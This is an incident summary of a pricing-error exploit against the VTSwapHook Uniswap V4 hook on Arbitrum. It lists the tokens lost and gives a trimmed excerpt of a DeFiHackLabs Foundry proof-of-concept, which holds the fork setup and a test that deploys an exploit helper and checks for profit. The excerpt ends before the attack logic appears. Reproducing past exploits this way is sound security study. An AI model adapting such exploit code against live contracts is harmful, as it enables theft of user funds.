# [?] VTSwapHook - Pricing Error in UniswapV4 Hook

## Summary
Severity: Unknown
Chain: Arbitrum
Component: VTSwapHook
Published: 2026-03-28
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/VTSwapHook_exp.sol
Type: defi-exploit-poc

## Details
Lost: 4,507,034.03 vATH + 2,007,935.14 ATH

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 446_382_719;
        vm.createSelectFork("arbitrum", forkBlock);

        multiAssetLog = true;
        attacker = ATTACKER;
        _addFundingToken(VATH);
        _addFundingToken(ATH);

        vm.label(ATTACKER, "Attacker / Profit Receiver");
        vm.label(ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(VTSWAP_HOOK, "VTSwapHook");
        vm.label(POOL_MANAGER, "Uniswap V4 PoolManager");
        vm.label(VATH, "vATH");
        vm.label(ATH, "ATH");
    }

    function testExploit() public balanceLog {
        uint256 vAthBefore = IERC20(VATH).balanceOf(ATTACKER);
        uint256 athBefore = IERC20(ATH).balanceOf(ATTACKER);

        // step 1: deploy a fresh helper; the trace helper was created in the tx and had no pre-existing state.
        VTSwapHookExploit exploit = new VTSwapHookExploit(ATTACKER);

        // step 2: execute one profitable V4 unlock round trip and forward both assets to the trace receiver.
        exploit.execute();

        assertGt(IERC20(VATH).balanceOf(ATTACKER), vAthBefore, "no vATH profit");
        assertGt(IERC20(ATH).balanceOf(ATTACKER), athBefore, "no ATH profit");
    }
}

contract VTSwapHookExploit {
    IUniswapV4PoolManager private constant manager = IUniswapV4PoolManager(POOL_MANAGER);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/VTSwapHook_exp.sol_
